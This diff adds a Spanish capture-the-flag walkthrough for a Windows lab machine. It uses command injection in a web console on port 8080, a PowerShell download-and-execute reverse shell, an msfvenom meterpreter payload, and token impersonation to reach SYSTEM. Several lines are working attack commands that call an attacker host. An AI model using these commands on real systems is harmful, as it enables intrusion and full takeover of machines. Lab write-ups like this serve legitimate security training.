@@ -1,0 +1,46 @@
+1.Hacer un escaneo sin ping 
+
+2.Una vez dentro del puerto 8080 investigamos si encontramos una vulnerabilidad y encontramos que en cada proyecto
+en la parte de configuracion te permite ingresar comandos y los ejecuta y te muestra la salida.
+
+3.Lo que podemos hacer es inyectar una reverse shell pero como esta funcionando en una consola cmd debemos poner los
+parametros correctos.
+
+4.powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+
+5.Una vez colocamos eso dentro de donde van los comandos en la pagina usamos nuestro servidor en python para pasarle el
+script y una vez se ejecute tendremos que tener a la escucha un puerto en netcat.
+
+6.Una vez hecho todos los pasos con esto tendriamos permisos para ingresar sin privilegios al sistema y podemos obtener 
+la flag del user.txt
+
+7. Ahora para escalar privilegios y para que sea mas sencillo lo haremos con metaesploit y teniendo una sesion de 
+meterpreter a la escucha.
+
+METAESPLOIT :
+
+8.msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.3.204 LPORT=1234 -f exe -o second_shell.exe
+con eso creamos el payload o la shell que vamos a correr para que nos devuelva la meterpreter.
+
+9.dentro de la shell que ya teniamos descargamos nuestra shell creada con :
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
+
+
+y luego ejecutamos : 
+
+	Start-Process "process.exe"
+
+10.Ya tenemos la meterpreter
+
+11.
+	- use incognito
+	- list_tokens -g
+	- impersonate_token "BUILTIN|Administrators" : para hacerse pasar por el token Administrators.
+	
+	
+12.cambiamos de proceso a services.exe o al mas estable que veamos y que sea ejecutado por NT AUTHORITY/SYSTEM
+
+
+
+
